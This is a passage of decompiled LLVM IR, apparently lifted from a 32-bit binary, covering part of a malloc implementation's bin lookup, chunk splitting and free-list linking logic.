dec_label_pc_14070:                               ; preds = %dec_label_pc_14068
  %v1_14070 = add i32 %v4_14044, -4
  store i32 %v1_14070, i32* %r1.global-to-local, align 4
  %v3_14074 = udiv i32 %v0_14068, 8
  store i32 %v3_14074, i32* %r2.global-to-local, align 4
  %v4_14078 = mul nuw i32 %v3_14074, 4
  %v5_14078 = add i32 %v4_14078, %v1_14070
  %v6_14078 = inttoptr i32 %v5_14078 to i32*
  %v7_14078 = load i32, i32* %v6_14078, align 4
  store i32 %v7_14078, i32* %r0.global-to-local, align 4
  %v2_1407c = icmp eq i32 %v7_14078, 0
  br i1 %v2_1407c, label %dec_label_pc_14090, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14070
  %v2_14080 = add i32 %v7_14078, 8
  %v3_14080 = inttoptr i32 %v2_14080 to i32*
  %v4_14080 = load i32, i32* %v3_14080, align 4
  store i32 %v4_14080, i32* %r3.global-to-local, align 4
  store i32 %v2_14080, i32* %r0.global-to-local, align 4
  store i32 %v2_14080, i32* %r4.global-to-local, align 4
  store i32 %v4_14080, i32* %v6_14078, align 4
  br label %dec_label_pc_14898

dec_label_pc_14090:                               ; preds = %dec_label_pc_14070, %dec_label_pc_14068
  %tmp205 = icmp ugt i32 %v0_14068, 255
  br i1 %tmp205, label %dec_label_pc_140e0, label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %dec_label_pc_14090
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_140a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  %v3_140a4 = udiv i32 %v0_14068, 8
  store i32 %v3_140a4, i32* @r7, align 4
  %v4_140a8 = mul nuw i32 %v3_140a4, 8
  %v5_140a8 = add i32 %v4_140a0, %v4_140a8
  store i32 %v5_140a8, i32* %r3.global-to-local, align 4
  %v1_140ac = add i32 %v5_140a8, 44
  store i32 %v1_140ac, i32* %ip.global-to-local, align 4
  %v1_140b0 = add i32 %v5_140a8, 56
  %v2_140b0 = inttoptr i32 %v1_140b0 to i32*
  %v3_140b0 = load i32, i32* %v2_140b0, align 4
  store i32 %v3_140b0, i32* %r0.global-to-local, align 4
  %v9_140b4 = icmp eq i32 %v3_140b0, %v1_140ac
  br i1 %v9_140b4, label %dec_label_pc_14240, label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %dec_label_pc_14098
  %v2_140bc = add i32 %v3_140b0, %v0_14068
  store i32 %v2_140bc, i32* %r3.global-to-local, align 4
  %v1_140c0 = add i32 %v2_140bc, 4
  %v2_140c0 = inttoptr i32 %v1_140c0 to i32*
  %v3_140c0 = load i32, i32* %v2_140c0, align 4
  store i32 %v3_140c0, i32* %r2.global-to-local, align 4
  %v1_140c4 = add i32 %v3_140b0, 12
  %v2_140c4 = inttoptr i32 %v1_140c4 to i32*
  %v3_140c4 = load i32, i32* %v2_140c4, align 4
  store i32 %v3_140c4, i32* %r1.global-to-local, align 4
  %v1_140c8 = or i32 %v3_140c0, 1
  store i32 %v1_140c8, i32* %r2.global-to-local, align 4
  %v1_140cc = add i32 %v3_140b0, 8
  store i32 %v1_140cc, i32* %r4.global-to-local, align 4
  store i32 %v1_140c8, i32* %v2_140c0, align 4
  %v0_140d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_140d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_140d4 = add i32 %v1_140d4, 8
  %v3_140d4 = inttoptr i32 %v2_140d4 to i32*
  store i32 %v0_140d4, i32* %v3_140d4, align 4
  %v0_140d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_140d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_140d8 = add i32 %v1_140d8, 12
  %v3_140d8 = inttoptr i32 %v2_140d8 to i32*
  store i32 %v0_140d8, i32* %v3_140d8, align 4
  br label %dec_label_pc_14898

dec_label_pc_140e0:                               ; preds = %dec_label_pc_14090
  store i32 %v0_14068, i32* %r0.global-to-local, align 4
  %v1_140e4 = call i32 @__malloc_largebin_index(i32 %v0_14068)
  store i32 %v1_140e4, i32* %r0.global-to-local, align 4
  %v0_140e8 = load i32, i32* @r4, align 4
  %v1_140e8 = and i32 %v0_140e8, 2
  %v2_140e8 = icmp eq i32 %v1_140e8, 0
  store i32 %v1_140e4, i32* @r7, align 4
  br i1 %v2_140e8, label %dec_label_pc_14240, label %dec_label_pc_140f4

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140e0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  %v4_140fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_140fc, i32* @r0, align 4
  %v0_14100 = call i32 @__malloc_consolidate()
  store i32 %v0_14100, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14240

dec_label_pc_14108:                               ; preds = %dec_label_pc_14254
  %v1_14108 = add i32 %v3_14254, 4
  %v2_14108 = inttoptr i32 %v1_14108 to i32*
  %v3_14108 = load i32, i32* %v2_14108, align 4
  store i32 %v3_14108, i32* %r3.global-to-local, align 4
  %v0_1410c = load i32, i32* @sl, align 4
  %v1_14110 = and i32 %v3_14108, -4
  store i32 %v1_14110, i32* %r4.global-to-local, align 4
  %v1_14114 = add i32 %v3_14254, 12
  %v2_14114 = inttoptr i32 %v1_14114 to i32*
  %v3_14114 = load i32, i32* %v2_14114, align 4
  store i32 %v3_14114, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1410c, 255
  br i1 %tmp206, label %dec_label_pc_14170, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_14108
  %v9_1411c = icmp eq i32 %v3_14114, %v0_14174
  br i1 %v9_1411c, label %dec_label_pc_14124, label %dec_label_pc_14170

dec_label_pc_14124:                               ; preds = %dec_label_pc_1411c
  %v0_14124 = load i32, i32* @sb, align 4
  %v1_14124 = add i32 %v0_14124, 48
  %v2_14124 = inttoptr i32 %v1_14124 to i32*
  %v3_14124 = load i32, i32* %v2_14124, align 4
  store i32 %v3_14124, i32* %r3.global-to-local, align 4
  %v9_14128 = icmp eq i32 %v3_14254, %v3_14124
  br i1 %v9_14128, label %dec_label_pc_14130, label %dec_label_pc_14170

dec_label_pc_14130:                               ; preds = %dec_label_pc_14124
  %v1_14130 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_14110, %v1_14130
  br i1 %tmp207, label %dec_label_pc_14138, label %dec_label_pc_14170

dec_label_pc_14138:                               ; preds = %dec_label_pc_14130
  %v2_14138 = sub i32 %v1_14110, %v0_1410c
  store i32 %v2_14138, i32* %r2.global-to-local, align 4
  %v2_1413c = add i32 %v0_1410c, %v3_14254
  store i32 %v2_1413c, i32* %r3.global-to-local, align 4
  %v1_14140 = or i32 %v0_1410c, 1
  store i32 %v1_14140, i32* %r0.global-to-local, align 4
  %v1_14144 = or i32 %v2_14138, 1
  store i32 %v1_14144, i32* %r1.global-to-local, align 4
  %v1_14148 = add i32 %v3_14254, 8
  store i32 %v1_14148, i32* %r4.global-to-local, align 4
  %v2_1414c = add i32 %v0_14174, 8
  %v3_1414c = inttoptr i32 %v2_1414c to i32*
  store i32 %v2_1413c, i32* %v3_1414c, align 4
  %v0_14150 = load i32, i32* %r3.global-to-local, align 4
  %v1_14150 = load i32, i32* %ip.global-to-local, align 4
  %v2_14150 = add i32 %v1_14150, 12
  %v3_14150 = inttoptr i32 %v2_14150 to i32*
  store i32 %v0_14150, i32* %v3_14150, align 4
  %v0_14154 = load i32, i32* %r0.global-to-local, align 4
  %v1_14154 = load i32, i32* @r6, align 4
  %v2_14154 = add i32 %v1_14154, 4
  %v3_14154 = inttoptr i32 %v2_14154 to i32*
  store i32 %v0_14154, i32* %v3_14154, align 4
  %v0_14158 = load i32, i32* %r3.global-to-local, align 4
  %v1_14158 = load i32, i32* @sb, align 4
  %v2_14158 = add i32 %v1_14158, 48
  %v3_14158 = inttoptr i32 %v2_14158 to i32*
  store i32 %v0_14158, i32* %v3_14158, align 4
  %v0_1415c = load i32, i32* %r2.global-to-local, align 4
  %v1_1415c = load i32, i32* %r3.global-to-local, align 4
  %v3_1415c = add i32 %v1_1415c, %v0_1415c
  %v4_1415c = inttoptr i32 %v3_1415c to i32*
  store i32 %v0_1415c, i32* %v4_1415c, align 4
  %v0_14160 = load i32, i32* %r1.global-to-local, align 4
  %v1_14160 = load i32, i32* %r3.global-to-local, align 4
  %v2_14160 = add i32 %v1_14160, 4
  %v3_14160 = inttoptr i32 %v2_14160 to i32*
  store i32 %v0_14160, i32* %v3_14160, align 4
  %v0_14164 = load i32, i32* %ip.global-to-local, align 4
  %v1_14164 = load i32, i32* %r3.global-to-local, align 4
  %v2_14164 = add i32 %v1_14164, 12
  %v3_14164 = inttoptr i32 %v2_14164 to i32*
  store i32 %v0_14164, i32* %v3_14164, align 4
  %v0_14168 = load i32, i32* %ip.global-to-local, align 4
  %v1_14168 = load i32, i32* %r3.global-to-local, align 4
  %v2_14168 = add i32 %v1_14168, 8
  %v3_14168 = inttoptr i32 %v2_14168 to i32*
  store i32 %v0_14168, i32* %v3_14168, align 4
  br label %dec_label_pc_14898

dec_label_pc_14170:                               ; preds = %dec_label_pc_14130, %dec_label_pc_14124, %dec_label_pc_1411c, %dec_label_pc_14108
  %v9_14170 = icmp eq i32 %v1_14110, %v0_1410c
  %v2_14174 = add i32 %v3_14114, 8
  %v3_14174 = inttoptr i32 %v2_14174 to i32*
  store i32 %v0_14174, i32* %v3_14174, align 4
  %v0_14178 = load i32, i32* %ip.global-to-local, align 4
  %v1_14178 = load i32, i32* %r5.global-to-local, align 4
  %v2_14178 = add i32 %v1_14178, 12
  %v3_14178 = inttoptr i32 %v2_14178 to i32*
  store i32 %v0_14178, i32* %v3_14178, align 4
  br i1 %v9_14170, label %dec_label_pc_142d0.loopexit, label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %dec_label_pc_14170
  %v0_1418c = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_1418c, 255
  br i1 %tmp208, label %dec_label_pc_141b0, label %dec_label_pc_14194

dec_label_pc_14194:                               ; preds = %dec_label_pc_1418c
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v1_14198 = load i32, i32* %r8.global-to-local, align 4
  %v2_14198 = add i32 %v1_14198, ptrtoint (i32* @global_var_24424.765 to i32)
  %v3_14198 = inttoptr i32 %v2_14198 to i32*
  %v4_14198 = load i32, i32* %v3_14198, align 4
  %v3_1419c = udiv i32 %v0_1418c, 8
  store i32 %v3_1419c, i32* %r0.global-to-local, align 4
  %v4_141a0 = mul nuw i32 %v3_1419c, 8
  %v5_141a0 = add i32 %v4_14198, %v4_141a0
  store i32 %v5_141a0, i32* %r3.global-to-local, align 4
  %v1_141a4 = add i32 %v5_141a0, 44
  store i32 %v1_141a4, i32* %ip.global-to-local, align 4
  %v1_141a8 = add i32 %v5_141a0, 52
  %v2_141a8 = inttoptr i32 %v1_141a8 to i32*
  %v3_141a8 = load i32, i32* %v2_141a8, align 4
  store i32 %v3_141a8, i32* @lr, align 4
  br label %dec_label_pc_14208

dec_label_pc_141b0:                               ; preds = %dec_label_pc_1418c
  store i32 %v0_1418c, i32* %r0.global-to-local, align 4
  %v1_141b4 = call i32 @__malloc_largebin_index(i32 %v0_1418c)
  store i32 %v1_141b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %ip.global-to-local, align 4
  %v1_141bc = load i32, i32* %r8.global-to-local, align 4
  %v2_141bc = add i32 %v1_141bc, ptrtoint (i32* @global_var_24424.765 to i32)
  %v3_141bc = inttoptr i32 %v2_141bc to i32*
  %v4_141bc = load i32, i32* %v3_141bc, align 4
  %v4_141c0 = mul i32 %v1_141b4, 8
  %v5_141c0 = add i32 %v4_141bc, %v4_141c0
  store i32 %v5_141c0, i32* %r3.global-to-local, align 4
  %v1_141c4 = add i32 %v5_141c0, 44
  store i32 %v1_141c4, i32* %ip.global-to-local, align 4
  %v1_141c8 = add i32 %v5_141c0, 52
  %v2_141c8 = inttoptr i32 %v1_141c8 to i32*
  %v3_141c8 = load i32, i32* %v2_141c8, align 4
  store i32 %v3_141c8, i32* @lr, align 4
  %v9_141cc = icmp eq i32 %v3_141c8, %v1_141c4
  br i1 %v9_141cc, label %dec_label_pc_14208, label %dec_label_pc_141d4

dec_label_pc_141d4:                               ; preds = %dec_label_pc_141b0
  %v1_141d4 = add i32 %v5_141c0, 56
  %v2_141d4 = inttoptr i32 %v1_141d4 to i32*
  %v3_141d4 = load i32, i32* %v2_141d4, align 4
  store i32 %v3_141d4, i32* %r1.global-to-local, align 4
  %v1_141d8 = add i32 %v3_141d4, 4
  %v2_141d8 = inttoptr i32 %v1_141d8 to i32*
  %v3_141d8 = load i32, i32* %v2_141d8, align 4
  store i32 %v3_141d8, i32* %r3.global-to-local, align 4
  %v0_141dc = load i32, i32* %r4.global-to-local, align 4
  %v3_141dc = icmp ult i32 %v0_141dc, %v3_141d8
  br i1 %v3_141dc, label %.thread, label %dec_label_pc_141f8.preheader

.thread:                                          ; preds = %dec_label_pc_141d4
  store i32 %v1_141c4, i32* @lr, align 4
  store i32 %v3_141d4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14208

dec_label_pc_141f8.preheader:                     ; preds = %dec_label_pc_141d4
  %v2_141e4 = or i32 %v0_141dc, 1
  store i32 %v2_141e4, i32* %r2.global-to-local, align 4
  %v1_141f8182 = add i32 %v3_141c8, 4
  %v2_141f8183 = inttoptr i32 %v1_141f8182 to i32*
  %v3_141f8184 = load i32, i32* %v2_141f8183, align 4
  store i32 %v3_141f8184, i32* %r3.global-to-local, align 4
  %v3_141fc186 = icmp ult i32 %v2_141e4, %v3_141f8184
  br i1 %v3_141fc186, label %dec_label_pc_141f4, label %dec_label_pc_14204

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141f8.preheader, %dec_label_pc_141f4
  %v0_14204187 = phi i32 [ %v3_141f4, %dec_label_pc_141f4 ], [ %v3_141c8, %dec_label_pc_141f8.preheader ]
  %v1_141f4 = add i32 %v0_14204187, 8
  %v2_141f4 = inttoptr i32 %v1_141f4 to i32*
  %v3_141f4 = load i32, i32* %v2_141f4, align 4
  store i32 %v3_141f4, i32* @lr, align 4
  %v1_141f8 = add i32 %v3_141f4, 4
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  store i32 %v3_141f8, i32* %r3.global-to-local, align 4
  %v3_141fc = icmp ult i32 %v2_141e4, %v3_141f8
  br i1 %v3_141fc, label %dec_label_pc_141f4, label %dec_label_pc_14204

dec_label_pc_14204:                               ; preds = %dec_label_pc_141f4, %dec_label_pc_141f8.preheader
  %v0_14204.lcssa = phi i32 [ %v3_141c8, %dec_label_pc_141f8.preheader ], [ %v3_141f4, %dec_label_pc_141f4 ]
  %v1_14204 = add i32 %v0_14204.lcssa, 12
  %v2_14204 = inttoptr i32 %v1_14204 to i32*
  %v3_14204 = load i32, i32* %v2_14204, align 4
  store i32 %v3_14204, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %.thread, %dec_label_pc_141b0, %dec_label_pc_14194, %dec_label_pc_14204
  %v0_14228 = phi i32 [ %v1_141c4, %dec_label_pc_141b0 ], [ %v1_141a4, %dec_label_pc_14194 ], [ %v3_14204, %dec_label_pc_14204 ], [ %v3_141d4, %.thread ]
  %v0_1421c = phi i32 [ %v1_141b4, %dec_label_pc_141b0 ], [ %v3_1419c, %dec_label_pc_14194 ], [ %v1_141b4, %dec_label_pc_14204 ], [ %v1_141b4, %.thread ]
  %v1_1420c = phi i32 [ %v1_141bc, %dec_label_pc_141b0 ], [ %v1_14198, %dec_label_pc_14194 ], [ %v1_141bc, %dec_label_pc_14204 ], [ %v1_141bc, %.thread ]
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v2_1420c = add i32 %v1_1420c, ptrtoint (i32* @global_var_24424.765 to i32)
  %v3_1420c = inttoptr i32 %v2_1420c to i32*
  %v4_1420c = load i32, i32* %v3_1420c, align 4
  %v3_14210 = sdiv i32 %v0_1421c, 32
  store i32 %v3_14210, i32* %r3.global-to-local, align 4
  %v4_14214 = mul nsw i32 %v3_14210, 4
  %v5_14214 = add i32 %v4_1420c, %v4_14214
  store i32 %v5_14214, i32* %r1.global-to-local, align 4
  %v1_14218 = add i32 %v5_14214, 820
  %v2_14218 = inttoptr i32 %v1_14218 to i32*
  %v3_14218 = load i32, i32* %v2_14218, align 4
  %v1_1421c = urem i32 %v0_1421c, 32
  store i32 %v1_1421c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_14224 = shl i32 1, %v1_1421c
  %v8_14224 = or i32 %v3_14218, %v7_14224
  store i32 %v8_14224, i32* %r3.global-to-local, align 4
  %v1_14228 = load i32, i32* @r6, align 4
  %v2_14228 = add i32 %v1_14228, 12
  %v3_14228 = inttoptr i32 %v2_14228 to i32*
  store i32 %v0_14228, i32* %v3_14228, align 4
  %v0_1422c = load i32, i32* @lr, align 4
  %v1_1422c = load i32, i32* @r6, align 4
  %v2_1422c = add i32 %v1_1422c, 8
  %v3_1422c = inttoptr i32 %v2_1422c to i32*
  store i32 %v0_1422c, i32* %v3_1422c, align 4
  %v0_14230 = load i32, i32* %r3.global-to-local, align 4
  %v1_14230 = load i32, i32* %r1.global-to-local, align 4
  %v2_14230 = add i32 %v1_14230, 820
  %v3_14230 = inttoptr i32 %v2_14230 to i32*
  store i32 %v0_14230, i32* %v3_14230, align 4
  %v0_14234 = load i32, i32* @r6, align 4
  %v1_14234 = load i32, i32* @lr, align 4
  %v2_14234 = add i32 %v1_14234, 12
  %v3_14234 = inttoptr i32 %v2_14234 to i32*
  store i32 %v0_14234, i32* %v3_14234, align 4
  %v0_14238 = load i32, i32* @r6, align 4
  %v1_14238 = load i32, i32* %ip.global-to-local, align 4
  %v2_14238 = add i32 %v1_14238, 8
  %v3_14238 = inttoptr i32 %v2_14238 to i32*
  store i32 %v0_14238, i32* %v3_14238, align 4
  %v0_14254.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14254

dec_label_pc_14240:                               ; preds = %dec_label_pc_140e0, %dec_label_pc_14098, %dec_label_pc_140f4
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  %v4_14248 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14248, i32* @sb, align 4
  %v0_1424c = load i32, i32* @sl, align 4
  %v1_1424c = add i32 %v0_1424c, 16
  store i32 %v1_1424c, i32* @fp, align 4
  %v1_14250 = add i32 %v4_14248, 52
  store i32 %v1_14250, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14254

dec_label_pc_14254:                               ; preds = %dec_label_pc_14208, %dec_label_pc_14240
  %v0_14174 = phi i32 [ %v0_14254.pre, %dec_label_pc_14208 ], [ %v1_14250, %dec_label_pc_14240 ]
  %v1_14254 = add i32 %v0_14174, 12
  %v2_14254 = inttoptr i32 %v1_14254 to i32*
  %v3_14254 = load i32, i32* %v2_14254, align 4
  store i32 %v3_14254, i32* @r6, align 4
  %v9_14258 = icmp eq i32 %v3_14254, %v0_14174
  br i1 %v9_14258, label %dec_label_pc_14260, label %dec_label_pc_14108

dec_label_pc_14260:                               ; preds = %dec_label_pc_14254
  %v0_14260 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_14260, 256
  %v0_14318.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_14260.dec_label_pc_14318_crit_edge, label %dec_label_pc_14268

dec_label_pc_14260.dec_label_pc_14318_crit_edge:  ; preds = %dec_label_pc_14260
  %.pre203 = mul i32 %v0_14318.pre, 8
  br label %dec_label_pc_14318

dec_label_pc_14268:                               ; preds = %dec_label_pc_14260
  %v4_14268 = mul i32 %v0_14318.pre, 8
  %v5_14268 = add i32 %v4_14268, %v0_14174
  store i32 %v5_14268, i32* %r3.global-to-local, align 4
  %v1_1426c = add i32 %v5_14268, -8
  store i32 %v1_1426c, i32* %r1.global-to-local, align 4
  %v1_14270 = add i32 %v5_14268, 4
  %v2_14270 = inttoptr i32 %v1_14270 to i32*
  %storemerge.pre = load i32, i32* %v2_14270, align 4
  br label %dec_label_pc_14310

dec_label_pc_14278:                               ; preds = %dec_label_pc_14310
  %v1_14278 = add i32 %v1_142a0, 4
  %v2_14278 = inttoptr i32 %v1_14278 to i32*
  %v3_14278 = load i32, i32* %v2_14278, align 4
  store i32 %v3_14278, i32* %r3.global-to-local, align 4
  %v1_1427c = and i32 %v3_14278, -4
  store i32 %v1_1427c, i32* %r2.global-to-local, align 4
  %v3_14280 = icmp ult i32 %v1_1427c, %v0_14260
  %v1_14284 = add i32 %v1_142a0, 12
  %v2_14284 = inttoptr i32 %v1_14284 to i32*
  %v3_14284 = load i32, i32* %v2_14284, align 4
  store i32 %v3_14284, i32* %r0.global-to-local, align 4
  br i1 %v3_14280, label %dec_label_pc_14310, label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14278
  %v1_1428c = add i32 %v1_142a0, 8
  %v2_1428c = inttoptr i32 %v1_1428c to i32*
  %v3_1428c = load i32, i32* %v2_1428c, align 4
  store i32 %v3_1428c, i32* %r1.global-to-local, align 4
  %v1_14290 = add i32 %v3_1428c, 12
  %v2_14290 = inttoptr i32 %v1_14290 to i32*
  %v3_14290 = load i32, i32* %v2_14290, align 4
  store i32 %v3_14290, i32* %r3.global-to-local, align 4
  %v9_14294 = icmp eq i32 %v3_14290, %v1_142a0
  br i1 %v9_14294, label %dec_label_pc_1429c, label %dec_label_pc_142a8

dec_label_pc_1429c:                               ; preds = %dec_label_pc_1428c
  %v1_1429c = add i32 %v3_14284, 8
  %v2_1429c = inttoptr i32 %v1_1429c to i32*
  %v3_1429c = load i32, i32* %v2_1429c, align 4
  store i32 %v3_1429c, i32* %r3.global-to-local, align 4
  %v9_142a0 = icmp eq i32 %v3_1429c, %v1_142a0
  br i1 %v9_142a0, label %dec_label_pc_142ac, label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %dec_label_pc_1428c, %dec_label_pc_1429c
  %v0_142a8 = call i32 @abort()
  store i32 %v0_142a8, i32* %r0.global-to-local, align 4
  %v0_142ac.pre = load i32, i32* @sl, align 4
  %v1_142ac.pre = load i32, i32* @r2, align 4
  %v0_142b4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_142ac

dec_label_pc_142ac:                               ; preds = %dec_label_pc_1429c, %dec_label_pc_142a8
  %v1_142b4 = phi i32 [ %v3_14284, %dec_label_pc_1429c ], [ %v0_142a8, %dec_label_pc_142a8 ]
  %v0_142b4 = phi i32 [ %v3_1428c, %dec_label_pc_1429c ], [ %v0_142b4.pre, %dec_label_pc_142a8 ]
  %v1_142ac = phi i32 [ %v1_1427c, %dec_label_pc_1429c ], [ %v1_142ac.pre, %dec_label_pc_142a8 ]
  %v0_142ac = phi i32 [ %v0_14260, %dec_label_pc_1429c ], [ %v0_142ac.pre, %dec_label_pc_142a8 ]
  %v2_142ac = sub i32 %v1_142ac, %v0_142ac
  store i32 %v2_142ac, i32* %lr.global-to-local, align 4
  %v2_142b4 = add i32 %v1_142b4, 8
  %v3_142b4 = inttoptr i32 %v2_142b4 to i32*
  store i32 %v0_142b4, i32* %v3_142b4, align 4
  %v0_142b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_142b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_142b8 = add i32 %v1_142b8, 12
  %v3_142b8 = inttoptr i32 %v2_142b8 to i32*
  store i32 %v0_142b8, i32* %v3_142b8, align 4
  %v0_142bc = load i32, i32* %ip.global-to-local, align 4
  %v1_142bc = add i32 %v0_142bc, 8
  store i32 %v1_142bc, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_142ac, 15
  br i1 %tmp210, label %dec_label_pc_142dc, label %dec_label_pc_142c4

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142ac
  %v1_142c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_142c4 = add i32 %v1_142c4, %v0_142bc
  store i32 %v2_142c4, i32* %r2.global-to-local, align 4
  %v1_142c8 = add i32 %v2_142c4, 4
  %v2_142c8 = inttoptr i32 %v1_142c8 to i32*
  %v3_142c8 = load i32, i32* %v2_142c8, align 4
  store i32 %v3_142c8, i32* %r3.global-to-local, align 4
  store i32 %v1_142bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_142d0.loopexit:                      ; preds = %dec_label_pc_14170
  %v1_1417c = load i32, i32* @r6, align 4
  %v2_1417c = load i32, i32* @sl, align 4
  %v3_1417c = add i32 %v2_1417c, %v1_1417c
  store i32 %v3_1417c, i32* %r2.global-to-local, align 4
  %v2_14180 = add i32 %v3_1417c, 4
  %v3_14180 = inttoptr i32 %v2_14180 to i32*
  %v4_14180 = load i32, i32* %v3_14180, align 4
  store i32 %v4_14180, i32* %r3.global-to-local, align 4
  %v2_14184 = add i32 %v1_1417c, 8
  store i32 %v2_14184, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_142d0:                               ; preds = %.dec_label_pc_142d0_crit_edge, %dec_label_pc_142d0.loopexit, %dec_label_pc_142c4
  %v1_142d4 = phi i32 [ %v4_143f8, %.dec_label_pc_142d0_crit_edge ], [ %v3_1417c, %dec_label_pc_142d0.loopexit ], [ %v2_142c4, %dec_label_pc_142c4 ]
  %v0_142d0 = phi i32 [ %v7_143f8, %.dec_label_pc_142d0_crit_edge ], [ %v4_14180, %dec_label_pc_142d0.loopexit ], [ %v3_142c8, %dec_label_pc_142c4 ]
  %v1_142d0 = or i32 %v0_142d0, 1
  store i32 %v1_142d0, i32* %r3.global-to-local, align 4
  %v2_142d4 = add i32 %v1_142d4, 4
  %v3_142d4 = inttoptr i32 %v2_142d4 to i32*
  store i32 %v1_142d0, i32* %v3_142d4, align 4
  br label %dec_label_pc_14898

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142ac
  %v1_142dc = load i32, i32* @sl, align 4
  %v2_142dc = add i32 %v1_142dc, %v0_142bc
  store i32 %v2_142dc, i32* %r2.global-to-local, align 4
  %v1_142e0 = or i32 %v1_142dc, 1
  store i32 %v1_142e0, i32* %r3.global-to-local, align 4
  %v0_142e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_142e4 = or i32 %v0_142e4, 1
  store i32 %v1_142e4, i32* %r1.global-to-local, align 4
  store i32 %v1_142bc, i32* %r4.global-to-local, align 4
  %v2_142ec = add i32 %v0_142bc, 4
  %v3_142ec = inttoptr i32 %v2_142ec to i32*
  store i32 %v1_142e0, i32* %v3_142ec, align 4
  %v0_142f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_142f0 = load i32, i32* @r6, align 4
  %v2_142f0 = add i32 %v1_142f0, 8
  %v3_142f0 = inttoptr i32 %v2_142f0 to i32*
  store i32 %v0_142f0, i32* %v3_142f0, align 4
  %v0_142f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_142f4 = load i32, i32* @r6, align 4
  %v2_142f4 = add i32 %v1_142f4, 12
  %v3_142f4 = inttoptr i32 %v2_142f4 to i32*
  store i32 %v0_142f4, i32* %v3_142f4, align 4
  %v0_142f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_142f8 = load i32, i32* %r2.global-to-local, align 4
  %v3_142f8 = add i32 %v1_142f8, %v0_142f8
  %v4_142f8 = inttoptr i32 %v3_142f8 to i32*
  store i32 %v0_142f8, i32* %v4_142f8, align 4
  %v0_142fc = load i32, i32* %r1.global-to-local, align 4
  %v1_142fc = load i32, i32* %r2.global-to-local, align 4
  %v2_142fc = add i32 %v1_142fc, 4
  %v3_142fc = inttoptr i32 %v2_142fc to i32*
  store i32 %v0_142fc, i32* %v3_142fc, align 4
  %v0_14300 = load i32, i32* @r6, align 4
  %v1_14300 = load i32, i32* %r2.global-to-local, align 4
  %v2_14300 = add i32 %v1_14300, 12
  %v3_14300 = inttoptr i32 %v2_14300 to i32*
  store i32 %v0_14300, i32* %v3_14300, align 4
  %v0_14304 = load i32, i32* @r6, align 4
  %v1_14304 = load i32, i32* %r2.global-to-local, align 4
  %v2_14304 = add i32 %v1_14304, 8
  %v3_14304 = inttoptr i32 %v2_14304 to i32*
  store i32 %v0_14304, i32* %v3_14304, align 4
  br label %dec_label_pc_14898

dec_label_pc_14310:                               ; preds = %dec_label_pc_14278, %dec_label_pc_14268
  %v1_142a0 = phi i32 [ %storemerge.pre, %dec_label_pc_14268 ], [ %v3_14284, %dec_label_pc_14278 ]
  store i32 %v1_142a0, i32* %ip.global-to-local, align 4
  %v9_14310 = icmp eq i32 %v1_142a0, %v1_1426c
  br i1 %v9_14310, label %dec_label_pc_14318.loopexit, label %dec_label_pc_14278

dec_label_pc_14318.loopexit:                      ; preds = %dec_label_pc_14310
  br label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_14260.dec_label_pc_14318_crit_edge, %dec_label_pc_14318.loopexit
